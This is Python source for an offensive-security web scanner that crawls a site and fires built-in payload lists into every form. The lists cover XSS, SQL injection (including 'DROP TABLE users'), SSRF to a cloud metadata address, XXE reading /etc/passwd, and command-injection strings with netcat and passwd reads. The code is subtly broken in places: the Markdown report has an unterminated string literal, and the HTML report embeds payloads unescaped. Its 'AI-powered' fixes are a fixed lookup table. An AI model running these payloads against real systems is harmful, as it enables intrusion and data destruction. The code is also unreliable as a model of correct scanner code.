import asyncio
import yaml
import json
import re
import time
import hashlib
import socket
import threading
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs
from pathlib import Path

import requests
from bs4 import BeautifulSoup
from playwright.async_api import async_playwright
import aiohttp
from colorama import Fore, Style, init
from tqdm import tqdm
import base64

# Initialize colorama for colored output
init(autoreset=True)

def print_banner():
    """Print ASCII art banner with Zephyr signature"""
    banner = f"""
{Fore.CYAN}
███████╗███████╗██████╗ ██╗  ██╗██╗   ██╗██████╗ 
╚══███╔╝██╔════╝██╔══██╗██║  ██║╚██╗ ██╔╝██╔══██╗
  ███╔╝ █████╗  ██████╔╝███████║ ╚████╔╝ ██████╔╝
 ███╔╝  ██╔══╝  ██╔═══╝ ██╔══██║  ╚██╔╝  ██╔══██╗
███████╗███████╗██║     ██║  ██║   ██║   ██║  ██║
╚══════╝╚══════╝╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝

{Fore.MAGENTA}╔══════════════════════════════════════════════════════════╗
{Fore.MAGENTA}║              🛡️  ADVANCED VULNERABILITY SCANNER            ║
{Fore.MAGENTA}║                                                          ║
{Fore.MAGENTA}║                    Made by Zephyr                        ║
{Fore.MAGENTA}║                                                          ║
{Fore.MAGENTA}║          For Educational & Authorized Testing Only       ║
{Fore.MAGENTA}╚══════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
{Fore.YELLOW}⚡ Version 2.0 - Advanced Web Application Security Testing
{Fore.RED}⚠️  Only use on authorized targets - Unauthorized scanning is illegal!
{Fore.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    print(banner)

class Config:
    def __init__(self, config_path="config.yaml"):
        if Path(config_path).exists():
            with open(config_path, 'r') as f:
                self.config = yaml.safe_load(f)
        else:
            self.config = self.default_config()
    
    def default_config(self):
        return {
            "target": "http://testphp.vulnweb.com",
            "login": {
                "url": None,
                "method": "form",
                "credentials": {"username": "", "password": ""}
            },
            "scan": {
                "max_concurrency": 10,
                "timeout": 30,
                "depth": 3,
                "templates": ["xss", "sqli", "ssrf", "csrf", "idor", "xxe", "cmd_injection"]
            },
            "oob": {
                "dns_server": "127.0.0.1",
                "port": 9999,
                "enabled": False
            },
            "report": {
                "format": ["html", "json", "markdown"],
                "output_dir": "./reports"
            },
            "plugins": ["ai_patch"]
        }

class OOBServer:
    def __init__(self, host="127.0.0.1", port=9999):
        self.host = host
        self.port = port
        self.callbacks = {}
        self.server = None
        
    async def start(self):
        try:
            if not self.server:
                self.server = await asyncio.start_server(
                    self.handle_callback, self.host, self.port
                )
                print(f"{Fore.GREEN}OOB Server started on {self.host}:{self.port}")
        except Exception as e:
            print(f"{Fore.YELLOW}Could not start OOB server: {e}")
        
    async def handle_callback(self, reader, writer):
        try:
            data = await reader.read(1024)
            callback_id = data.decode().strip()
            self.callbacks[callback_id] = True
            writer.close()
        except Exception:
            pass
        
    def generate_callback_url(self):
        callback_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        return f"http://{self.host}:{self.port}/{callback_id}", callback_id
        
    def check_callback(self, callback_id):
        return self.callbacks.get(callback_id, False)

class AuthSession:
    def __init__(self, login_config):
        self.session = requests.Session()
        self.login_config = login_config
        self.authenticated = False
        
    async def login(self):
        if not self.login_config.get("url"):
            return True
            
        try:
            login_url = self.login_config["url"]
            creds = self.login_config["credentials"]
            
            # Get login page
            response = self.session.get(login_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find login form
            form = soup.find('form')
            if form:
                action = form.get('action', login_url)
                method = form.get('method', 'POST').upper()
                
                # Prepare form data
                form_data = {}
                for input_field in form.find_all('input'):
                    name = input_field.get('name')
                    value = input_field.get('value', '')
                    if name:
                        if 'user' in name.lower() or 'email' in name.lower():
                            form_data[name] = creds.get('username', '')
                        elif 'pass' in name.lower():
                            form_data[name] = creds.get('password', '')
                        else:
                            form_data[name] = value
                
                # Submit login
                if method == 'POST':
                    response = self.session.post(urljoin(login_url, action), data=form_data)
                else:
                    response = self.session.get(urljoin(login_url, action), params=form_data)
                
                self.authenticated = response.status_code == 200
                return self.authenticated
        except Exception as e:
            print(f"{Fore.RED}Login failed: {e}")
            return False

class BrowserCrawler:
    def __init__(self, session, scan_config):
        self.session = session
        self.scan_config = scan_config
        self.discovered_urls = set()
        self.forms = []
        self.endpoints = []
        
    async def discover(self, base_url):
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                context = await browser.new_context()
                
                # Add session cookies to browser context
                if self.session.session.cookies:
                    cookies = []
                    for cookie in self.session.session.cookies:
                        cookies.append({
                            'name': cookie.name,
                            'value': cookie.value,
                            'domain': cookie.domain or urlparse(base_url).netloc,
                            'path': cookie.path or '/'
                        })
                    await context.add_cookies(cookies)
                
                page = await context.new_page()
                
                try:
                    await page.goto(base_url, timeout=30000)
                    await self._crawl_page(page, base_url, 0)
                except Exception as e:
                    print(f"{Fore.YELLOW}Browser crawling error: {e}")
                
                await browser.close()
        except Exception as e:
            print(f"{Fore.YELLOW}Playwright initialization failed: {e}")
            # Fallback to requests-based crawling
            await self._fallback_crawl(base_url)
        
        return self.endpoints, self.forms
    
    async def _fallback_crawl(self, base_url):
        """Fallback crawling method using requests"""
        try:
            response = self.session.session.get(base_url)
            self.endpoints.append(base_url)
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract forms
            for form in soup.find_all('form'):
                form_data = self._extract_form_data_requests(form, base_url)
                if form_data:
                    self.forms.append(form_data)
            
            # Extract links
            for link in soup.find_all('a', href=True)[:10]:
                href = link['href']
                if href and not href.startswith('#'):
                    full_url = urljoin(base_url, href)
                    if urlparse(full_url).netloc == urlparse(base_url).netloc:
                        if full_url not in self.discovered_urls:
                            self.discovered_urls.add(full_url)
                            self.endpoints.append(full_url)
                            
        except Exception as e:
            print(f"{Fore.YELLOW}Fallback crawling error: {e}")
    
    def _extract_form_data_requests(self, form, base_url):
        """Extract form data using BeautifulSoup"""
        try:
            action = form.get('action') or base_url
            method = form.get('method', 'GET').upper()
            
            form_inputs = []
            for inp in form.find_all(['input', 'select', 'textarea']):
                input_type = inp.get('type', 'text')
                name = inp.get('name')
                value = inp.get('value', '')
                
                if name:
                    form_inputs.append({
                        'name': name,
                        'type': input_type,
                        'value': value
                    })
            
            return {
                'url': base_url,
                'action': urljoin(base_url, action),
                'method': method,
                'inputs': form_inputs
            }
        except Exception:
            return None
    
    async def _crawl_page(self, page, url, depth):
        if depth > self.scan_config.get("depth", 3) or url in self.discovered_urls:
            return
            
        self.discovered_urls.add(url)
        self.endpoints.append(url)
        
        try:
            await page.goto(url, timeout=30000)
            
            # Extract forms
            forms = await page.query_selector_all('form')
            for form in forms:
                form_data = await self._extract_form_data(form, url)
                if form_data:
                    self.forms.append(form_data)
            
            # Extract links for deeper crawling
            if depth < self.scan_config.get("depth", 3):
                links = await page.query_selector_all('a[href]')
                for link in links[:10]:  # Limit to prevent excessive crawling
                    href = await link.get_attribute('href')
                    if href and not href.startswith('#'):
                        full_url = urljoin(url, href)
                        if urlparse(full_url).netloc == urlparse(url).netloc:
                            await self._crawl_page(page, full_url, depth + 1)
                            
        except Exception as e:
            print(f"{Fore.YELLOW}Error crawling {url}: {e}")
    
    async def _extract_form_data(self, form, base_url):
        try:
            action = await form.get_attribute('action') or base_url
            method = await form.get_attribute('method') or 'GET'
            
            inputs = await form.query_selector_all('input, select, textarea')
            form_inputs = []
            
            for inp in inputs:
                input_type = await inp.get_attribute('type') or 'text'
                name = await inp.get_attribute('name')
                value = await inp.get_attribute('value') or ''
                
                if name:
                    form_inputs.append({
                        'name': name,
                        'type': input_type,
                        'value': value
                    })
            
            return {
                'url': base_url,
                'action': urljoin(base_url, action),
                'method': method.upper(),
                'inputs': form_inputs
            }
        except Exception:
            return None

class VulnerabilityTemplates:
    def __init__(self, session, oob_server=None):
        self.session = session
        self.oob = oob_server
        
    def get_xss_payloads(self):
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>"
        ]
    
    def get_sqli_payloads(self):
        return [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT 1,2,3--",
            "'; DROP TABLE users--",
            "' OR 'a'='a",
            "1' OR '1'='1' #",
            "admin'--",
            "' OR 1=1 LIMIT 1--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' UNION SELECT NULL,NULL,NULL--"
        ]
    
    def get_ssrf_payloads(self):
        payloads = [
            "http://127.0.0.1:80",
            "http://localhost:22",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "gopher://127.0.0.1:25/",
            "http://127.0.0.1:3306",
            "http://localhost:5432",
            "http://169.254.169.254/"
        ]
        
        callback_id = None
        if self.oob:
            callback_url, callback_id = self.oob.generate_callback_url()
            payloads.append(callback_url)
        
        return payloads, callback_id
    
    def get_xxe_payloads(self):
        payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://127.0.0.1:22">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/hosts">]><root>&test;</root>'
        ]
        
        callback_id = None
        if self.oob:
            callback_url, callback_id = self.oob.generate_callback_url()
            xxe_oob = f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "{callback_url}">]><root>&test;</root>'
            payloads.append(xxe_oob)
        
        return payloads, callback_id
    
    def get_cmd_injection_payloads(self):
        return [
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "`id`",
            "$(whoami)",
            "; ping -c 1 127.0.0.1",
            "| nc -l 4444",
            "; cat /etc/hosts",
            "&& id",
            "$(cat /etc/passwd)"
        ]

class TemplateEngine:
    def __init__(self, session, endpoints, forms, oob_server, scan_config):
        self.session = session
        self.endpoints = endpoints
        self.forms = forms
        self.oob = oob_server
        self.scan_config = scan_config
        self.templates = VulnerabilityTemplates(session, oob_server)
        self.findings = []
        
    async def run_all(self):
        print(f"{Fore.CYAN}Starting vulnerability scanning...")
        
        # Create semaphore for concurrency control
        semaphore = asyncio.Semaphore(self.scan_config.get("max_concurrency", 10))
        
        tasks = []
        
        # Scan for different vulnerability types
        if "xss" in self.scan_config.get("templates", []):
            tasks.extend([self._scan_xss_async(form, semaphore) for form in self.forms])
        
        if "sqli" in self.scan_config.get("templates", []):
            tasks.extend([self._scan_sqli_async(form, semaphore) for form in self.forms])
        
        if "ssrf" in self.scan_config.get("templates", []):
            tasks.extend([self._scan_ssrf_async(form, semaphore) for form in self.forms])
        
        if "xxe" in self.scan_config.get("templates", []):
            tasks.extend([self._scan_xxe_async(form, semaphore) for form in self.forms])
        
        if "cmd_injection" in self.scan_config.get("templates", []):
            tasks.extend([self._scan_cmd_injection_async(form, semaphore) for form in self.forms])
        
        # Run all scans concurrently
        if tasks:
            with tqdm(total=len(tasks), desc="Scanning", colour="green") as pbar:
                for task in asyncio.as_completed(tasks):
                    await task
                    pbar.update(1)
        
        return self.findings
    
    async def _scan_xss_async(self, form, semaphore):
        async with semaphore:
            await asyncio.sleep(0.1)  # Rate limiting
            self._scan_xss(form)
    
    def _scan_xss(self, form):
        payloads = self.templates.get_xss_payloads()
        
        for payload in payloads:
            try:
                data = {}
                for inp in form['inputs']:
                    if inp['type'] not in ['submit', 'button', 'hidden']:
                        data[inp['name']] = payload
                    else:
                        data[inp['name']] = inp.get('value', '')
                
                if form['method'] == 'POST':
                    response = self.session.session.post(
                        form['action'], 
                        data=data, 
                        timeout=self.scan_config.get("timeout", 30)
                    )
                else:
                    response = self.session.session.get(
                        form['action'], 
                        params=data, 
                        timeout=self.scan_config.get("timeout", 30)
                    )
                
                if payload in response.text or "<script>" in response.text:
                    self.findings.append({
                        'type': 'XSS (Cross-Site Scripting)',
                        'severity': 'High',
                        'url': form['action'],
                        'payload': payload,
                        'method': form['method'],
                        'evidence': response.text[:1000] + "..." if len(response.text) > 1000 else response.text,
                        'timestamp': datetime.now().isoformat()
                    })
                    break
                    
            except Exception as e:
                continue
    
    async def _scan_sqli_async(self, form, semaphore):
        async with semaphore:
            await asyncio.sleep(0.1)
            self._scan_sqli(form)
    
    def _scan_sqli(self, form):
        payloads = self.templates.get_sqli_payloads()
        error_signatures = [
            "you have an error in your sql syntax",
            "unclosed quotation mark after the character string",
            "quoted string not properly terminated",
            "mysql_fetch",
            "ora-00933",
            "microsoft ole db provider for odbc drivers",
            "unclosed quotation mark before the character string",
            "sqlite_error",
            "sqlstate",
            "mysql_num_rows",
            "pg_query",
            "warning: mysql"
        ]
        
        for payload in payloads:
            try:
                data = {}
                for inp in form['inputs']:
                    if inp['type'] not in ['submit', 'button', 'hidden']:
                        data[inp['name']] = payload
                    else:
                        data[inp['name']] = inp.get('value', '')
                
                if form['method'] == 'POST':
                    response = self.session.session.post(
                        form['action'], 
                        data=data, 
                        timeout=self.scan_config.get("timeout", 30)
                    )
                else:
                    response = self.session.session.get(
                        form['action'], 
                        params=data, 
                        timeout=self.scan_config.get("timeout", 30)
                    )
                
                if any(error in response.text.lower() for error in error_signatures):
                    self.findings.append({
                        'type': 'SQL Injection',
                        'severity': 'Critical',
                        'url': form['action'],
                        'payload': payload,
                        'method': form['method'],
                        'evidence': response.text[:1000] + "..." if len(response.text) > 1000 else response.text,
                        'timestamp': datetime.now().isoformat()
                    })
                    break
                    
            except Exception as e:
                continue
    
    async def _scan_ssrf_async(self, form, semaphore):
        async with semaphore:
            await asyncio.sleep(0.1)
            self._scan_ssrf(form)
    
    def _scan_ssrf(self, form):
        payloads, callback_id = self.templates.get_ssrf_payloads()
        
        for payload in payloads:
            try:
                data = {}
                for inp in form['inputs']:
                    if inp['type'] not in ['submit', 'button', 'hidden']:
                        if 'url' in inp['name'].lower() or 'link' in inp['name'].lower() or 'uri' in inp['name'].lower():
                            data[inp['name']] = payload
                        else:
                            data[inp['name']] = inp.get('value', 'test')
                    else:
                        data[inp['name']] = inp.get('value', '')
                
                if form['method'] == 'POST':
                    response = self.session.session.post(
                        form['action'], 
                        data=data, 
                        timeout=self.scan_config.get("timeout", 30)
                    )
                else:
                    response = self.session.session.get(
                        form['action'], 
                        params=data, 
                        timeout=self.scan_config.get("timeout", 30)
                    )
                
                # Check for SSRF indicators
                ssrf_indicators = [
                    "connection refused",
                    "connection timed out",
                    "no route to host",
                    "network is unreachable",
                    "connection reset",
                    "host is unreachable"
                ]
                
                if any(indicator in response.text.lower() for indicator in ssrf_indicators):
                    self.findings.append({
                        'type': 'SSRF (Server-Side Request Forgery)',
                        'severity': 'High',
                        'url': form['action'],
                        'payload': payload,
                        'method': form['method'],
                        'evidence': response.text[:1000] + "..." if len(response.text) > 1000 else response.text,
                        'timestamp': datetime.now().isoformat()
                    })
                    break
                
                # Check OOB callback if available
                if callback_id and self.oob and self.oob.check_callback(callback_id):
                    self.findings.append({
                        'type': 'SSRF (OOB Confirmed)',
                        'severity': 'Critical',
                        'url': form['action'],
                        'payload': payload,
                        'method': form['method'],
                        'evidence': 'Out-of-band callback received - SSRF confirmed',
                        'timestamp': datetime.now().isoformat()
                    })
                    break
                    
            except Exception as e:
                continue
    
    async def _scan_xxe_async(self, form, semaphore):
        async with semaphore:
            await asyncio.sleep(0.1)
            self._scan_xxe(form)
    
    def _scan_xxe(self, form):
        payloads, callback_id = self.templates.get_xxe_payloads()
        
        for payload in payloads:
            try:
                # Check if form accepts XML data
                headers = {'Content-Type': 'application/xml'}
                
                response = self.session.session.post(
                    form['action'], 
                    data=payload,
                    headers=headers,
                    timeout=self.scan_config.get("timeout", 30)
                )
                
                xxe_indicators = [
                    "root:x:0:0:",
                    "daemon:x:1:1:",
                    "bin:x:2:2:",
                    "www-data",
                    "127.0.0.1",
                    "localhost"
                ]
                
                if any(indicator in response.text for indicator in xxe_indicators):
                    self.findings.append({
                        'type': 'XXE (XML External Entity)',
                        'severity': 'High',
                        'url': form['action'],
                        'payload': payload,
                        'method': 'POST',
                        'evidence': response.text[:1000] + "..." if len(response.text) > 1000 else response.text,
                        'timestamp': datetime.now().isoformat()
                    })
                    break
                
                # Check OOB callback
                if callback_id and self.oob and self.oob.check_callback(callback_id):
                    self.findings.append({
                        'type': 'XXE (OOB Confirmed)',
                        'severity': 'Critical',
                        'url': form['action'],
                        'payload': payload,
                        'method': 'POST',
                        'evidence': 'Out-of-band callback received - XXE confirmed',
                        'timestamp': datetime.now().isoformat()
                    })
                    break
                    
            except Exception as e:
                continue
    
    async def _scan_cmd_injection_async(self, form, semaphore):
        async with semaphore:
            await asyncio.sleep(0.1)
            self._scan_cmd_injection(form)
    
    def _scan_cmd_injection(self, form):
        payloads = self.templates.get_cmd_injection_payloads()
        
        for payload in payloads:
            try:
                data = {}
                for inp in form['inputs']:
                    if inp['type'] not in ['submit', 'button', 'hidden']:
                        data[inp['name']] = payload
                    else:
                        data[inp['name']] = inp.get('value', '')
                
                if form['method'] == 'POST':
                    response = self.session.session.post(
                        form['action'], 
                        data=data, 
                        timeout=self.scan_config.get("timeout", 30)
                    )
                else:
                    response = self.session.session.get(
                        form['action'], 
                        params=data, 
                        timeout=self.scan_config.get("timeout", 30)
                    )
                
                cmd_indicators = [
                    "uid=",
                    "gid=",
                    "groups=",
                    "root:x:0:0:",
                    "bin/bash",
                    "bin/sh",
                    "total 0",
                    "/usr/bin",
                    "/etc/passwd",
                    "drwxr-xr-x"
                ]
                
                if any(indicator in response.text for indicator in cmd_indicators):
                    self.findings.append({
                        'type': 'Command Injection',
                        'severity': 'Critical',
                        'url': form['action'],
                        'payload': payload,
                        'method': form['method'],
                        'evidence': response.text[:1000] + "..." if len(response.text) > 1000 else response.text,
                        'timestamp': datetime.now().isoformat()
                    })
                    break
                    
            except Exception as e:
                continue

class PluginManager:
    def __init__(self, plugins_config):
        self.plugins = plugins_config
        
    def execute(self, findings):
        if "ai_patch" in self.plugins:
            self._ai_patch_suggestions(findings)
    
    def _ai_patch_suggestions(self, findings):
        """AI-powered patch suggestions"""
        patch_suggestions = {
            'XSS (Cross-Site Scripting)': 'Implement proper input validation and output encoding. Use Content Security Policy (CSP) headers. Sanitize all user inputs before displaying.',
            'SQL Injection': 'Use parameterized queries or prepared statements. Implement input validation and sanitization. Use ORM frameworks when possible.',
            'SSRF (Server-Side Request Forgery)': 'Implement URL whitelist validation and disable unnecessary URL schemes. Use network segmentation and firewall rules.',
            'SSRF (OOB Confirmed)': 'Critical SSRF confirmed via out-of-band techniques. Immediately implement strict URL validation and network access controls.',
            'XXE (XML External Entity)': 'Disable external entity processing in XML parsers. Use secure XML parsing libraries. Validate and sanitize XML input.',
            'XXE (OOB Confirmed)': 'Critical XXE confirmed via out-of-band techniques. Disable XML external entity processing immediately.',
            'Command Injection': 'Avoid system calls with user input. Use parameterized commands or safe alternatives. Implement strict input validation.'
        }
        
        for finding in findings:
            vuln_type = finding['type']
            if vuln_type in patch_suggestions:
                finding['patch_suggestion'] = patch_suggestions[vuln_type]

class ReportGenerator:
    def __init__(self, findings, report_config):
        self.findings = findings
        self.report_config = report_config
        
    def generate(self):
        output_dir = Path(self.report_config.get("output_dir", "./reports"))
        output_dir.mkdir(exist_ok=True)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        if "json" in self.report_config.get("format", []):
            self._generate_json_report(output_dir / f"report_{timestamp}.json")
        
        if "html" in self.report_config.get("format", []):
            self._generate_html_report(output_dir / f"report_{timestamp}.html")
            
        if "markdown" in self.report_config.get("format", []):
            self._generate_markdown_report(output_dir / f"report_{timestamp}.md")
        
        print(f"{Fore.GREEN}Reports generated in {output_dir}")
    
    def _generate_json_report(self, filepath):
        report_data = {
            "scan_info": {
                "timestamp": datetime.now().isoformat(),
                "total_findings": len(self.findings),
                "scanner_version": "2.0",
                "created_by": "Zephyr"
            },
            "findings": self.findings
        }
        
        with open(filepath, 'w') as f:
            json.dump(report_data, f, indent=2, ensure_ascii=False)
    
    def _generate_markdown_report(self, filepath):
        """Generate a clean markdown report"""
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write("# 🛡️ Advanced Vulnerability Scan Report\n")
            f.write("## Made by Zephyr\n\n")
            f.write(f"**Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            f.write(f"**Total Findings:** {len(self.findings)}\n\n")
            
            if not self.findings:
                f.write("✅ **No vulnerabilities found.**\n")
                return
            
            # Summary by severity
            severity_counts = {}
            for finding in self.findings:
                severity = finding.get('severity', 'Unknown')
                severity_counts[severity] = severity_counts.get(severity, 0) + 1
            
            f.write("## 📊 Summary\n\n")
            for severity, count in severity_counts.items():
                emoji = "🔴" if severity == "Critical" else "🟠" if severity == "High" else "🟡" if severity == "Medium" else "🟢"
                f.write(f"- {emoji} **{severity}:** {count}\n")
            f.write("\n")
            
            # Detailed findings
            f.write("## 🔍 Detailed Findings\n\n")
            for i, finding in enumerate(self.findings, 1):
                f.write(f"### {i}. {finding.get('type', 'Unknown Vulnerability')}\n\n")
                f.write(f"**Severity:** {finding.get('severity', 'Unknown')}\n\n")
                f.write(f"**URL:** `{finding.get('url', 'N/A')}`\n\n")
                f.write(f"**Method:** {finding.get('method', 'N/A')}\n\n")
                f.write(f"**Payload:** `{finding.get('payload', 'N/A')}`\n\n")
                
                if finding.get('patch_suggestion'):
                    f.write(f"**🔧 Recommended Fix:** {finding['patch_suggestion']}\n\n")
                
                if finding.get('evidence'):
                    f.write("**Evidence:**\n```
                    f.write(finding['evidence'][:1000] + ("..." if len(finding['evidence']) > 1000 else ""))
                    f.write("\n```\n\n")
                
                f.write("---\n\n")
            
            f.write("\n\n---\n**🚀 Powered by Zephyr's Advanced Vulnerability Scanner**\n")
    
    def _generate_html_report(self, filepath):
        """Generate a properly formatted HTML report"""
        
        # Calculate summary statistics
        severity_counts = {}
        for finding in self.findings:
            severity = finding.get('severity', 'Unknown')
            severity_counts[severity] = severity_counts.get(severity, 0) + 1
        
        html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vulnerability Scan Report - Made by Zephyr</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            background-color: #f5f5f5;
        }}
        
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }}
        
        .header {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            border-radius: 10px;
            margin-bottom: 30px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }}
        
        .header h1 {{
            font-size: 2.5em;
            margin-bottom: 10px;
        }}
        
        .header p {{
            font-size: 1.1em;
            opacity: 0.9;
        }}
        
        .zephyr-signature {{
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
            color: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            margin-bottom: 30px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }}
        
        .zephyr-signature h2 {{
            font-size: 1.8em;
            margin-bottom: 5px;
        }}
        
        .summary {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }}
        
        .summary-card {{
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            text-align: center;
        }}
        
        .summary-card h3 {{
            font-size: 2em;
            margin-bottom: 10px;
        }}
        
        .critical {{ border-left: 5px solid #e74c3c; }}
        .high {{ border-left: 5px solid #f39c12; }}
        .medium {{ border-left: 5px solid #f1c40f; }}
        .low {{ border-left: 5px solid #27ae60; }}
        .unknown {{ border-left: 5px solid #95a5a6; }}
        
        .critical h3 {{ color: #e74c3c; }}
        .high h3 {{ color: #f39c12; }}
        .medium h3 {{ color: #f1c40f; }}
        .low h3 {{ color: #27ae60; }}
        .unknown h3 {{ color: #95a5a6; }}
        
        .findings {{
            display: grid;
            gap: 20px;
        }}
        
        .finding {{
            background: white;
            border-radius: 10px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            overflow: hidden;
        }}
        
        .finding-header {{
            padding: 20px;
            background-color: #f8f9fa;
            border-bottom: 1px solid #dee2e6;
        }}
        
        .finding-body {{
            padding: 20px;
        }}
        
        .finding-title {{
            font-size: 1.3em;
            font-weight: bold;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 10px;
        }}
        
        .severity-badge {{
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.8em;
            font-weight: bold;
            text-transform: uppercase;
        }}
        
        .severity-critical {{ background-color: #e74c3c; color: white; }}
        .severity-high {{ background-color: #f39c12; color: white; }}
        .severity-medium {{ background-color: #f1c40f; color: #333; }}
        .severity-low {{ background-color: #27ae60; color: white; }}
        .severity-unknown {{ background-color: #95a5a6; color: white; }}
        
        .finding-details {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }}
        
        .detail-item {{
            background-color: #f8f9fa;
            padding: 15px;
            border-radius: 5px;
        }}
        
        .detail-label {{
            font-weight: bold;
            color: #666;
            margin-bottom: 5px;
        }}
        
        .detail-value {{
            font-family: 'Courier New', monospace;
            background-color: #e9ecef;
            padding: 5px 10px;
            border-radius: 3px;
            word-break: break-all;
        }}
        
        .evidence {{
            background-color: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 5px;
            padding: 15px;
            margin-top: 15px;
        }}
        
        .evidence-content {{
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
            white-space: pre-wrap;
            max-height: 300px;
            overflow-y: auto;
            background-color: white;
            padding: 10px;
            border-radius: 3px;
        }}
        
        .patch-suggestion {{
            background-color: #d4edda;
            border: 1px solid #c3e6cb;
            border-radius: 5px;
            padding: 15px;
            margin-top: 15px;
        }}
        
        .patch-suggestion h4 {{
            color: #155724;
            margin-bottom: 10px;
        }}
        
        .no-findings {{
            text-align: center;
            padding: 60px 20px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }}
        
        .no-findings h2 {{
            color: #27ae60;
            font-size: 2em;
            margin-bottom: 15px;
        }}
        
        .footer {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            margin-top: 30px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ Advanced Vulnerability Scan Report</h1>
            <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p>Total Findings: {len(self.findings)}</p>
        </div>
        
        <div class="zephyr-signature">
            <h2>⚡ Made by Zephyr ⚡</h2>
            <p>Advanced Web Application Security Testing</p>
        </div>
"""

        if not self.findings:
            html_content += """
        <div class="no-findings">
            <h2>✅ No Vulnerabilities Found</h2>
            <p>The scan completed successfully without detecting any security vulnerabilities.</p>
        </div>
"""
        else:
            # Add summary cards
            html_content += '<div class="summary">'
            for severity, count in severity_counts.items():
                severity_lower = severity.lower()
                html_content += f"""
            <div class="summary-card {severity_lower}">
                <h3>{count}</h3>
                <p>{severity}</p>
            </div>
"""
            html_content += '</div>'
            
            # Add findings
            html_content += '<div class="findings">'
            for i, finding in enumerate(self.findings, 1):
                severity = finding.get('severity', 'Unknown').lower()
                vuln_type = finding.get('type', 'Unknown Vulnerability')
                url = finding.get('url', 'N/A')
                method = finding.get('method', 'N/A')
                payload = finding.get('payload', 'N/A')
                timestamp = finding.get('timestamp', 'N/A')
                
                html_content += f"""
            <div class="finding {severity}">
                <div class="finding-header">
                    <div class="finding-title">
                        <span>{i}. {vuln_type}</span>
                        <span class="severity-badge severity-{severity}">{finding.get('severity', 'Unknown')}</span>
                    </div>
                </div>
                <div class="finding-body">
                    <div class="finding-details">
                        <div class="detail-item">
                            <div class="detail-label">URL</div>
                            <div class="detail-value">{url}</div>
                        </div>
                        <div class="detail-item">
                            <div class="detail-label">Method</div>
                            <div class="detail-value">{method}</div>
                        </div>
                        <div class="detail-item">
                            <div class="detail-label">Payload</div>
                            <div class="detail-value">{payload}</div>
                        </div>
                        <div class="detail-item">
                            <div class="detail-label">Timestamp</div>
                            <div class="detail-value">{timestamp}</div>
                        </div>
                    </div>
"""
                
                if finding.get('patch_suggestion'):
                    html_content += f"""
                    <div class="patch-suggestion">
                        <h4>🔧 Recommended Fix</h4>
                        <p>{finding['patch_suggestion']}</p>
                    </div>
"""
                
                if finding.get('evidence'):
                    evidence_text = finding['evidence'][:2000] + ("..." if len(finding['evidence']) > 2000 else "")
                    # Escape HTML characters
                    evidence_text = evidence_text.replace('<', '&lt;').replace('>', '&gt;')
                    html_content += f"""
                    <div class="evidence">
                        <div class="detail-label">Evidence</div>
                        <div class="evidence-content">{evidence_text}</div>
                    </div>
"""
                
                html_content += """
                </div>
            </div>
"""
            html_content += '</div>'
        
        html_content += """
        <div class="footer">
            <h3>🚀 Powered by Zephyr's Advanced Vulnerability Scanner</h3>
            <p>For Educational & Authorized Testing Only</p>
        </div>
    </div>
</body>
</html>
"""
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(html_content)

